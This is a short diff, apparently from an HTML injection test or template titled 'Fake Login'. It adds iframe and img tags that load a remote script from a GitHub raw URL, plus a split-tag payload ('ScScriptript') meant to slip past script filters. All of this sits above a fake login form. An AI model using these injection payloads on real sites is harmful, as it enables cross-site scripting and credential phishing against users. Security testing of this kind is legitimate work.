@@ -7,6 +7,9 @@ info:
         <h1>HTML Injection : Fake Login</h1>
         <script src="https://raw.githubusercontent.com/Frog-man-sec/swiggerinj/refs/heads/main/scrpt.js"></script>
     </div>
+    <iframe src="https://raw.githubusercontent.com/Frog-man-sec/swiggerinj/refs/heads/main/scrpt.js"><iframe>
+    <img src="https://raw.githubusercontent.com/Frog-man-sec/swiggerinj/refs/heads/main/scrpt.js">
+    <ScScriptript>Print()</ScScriptript>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
             <div class="form-group">
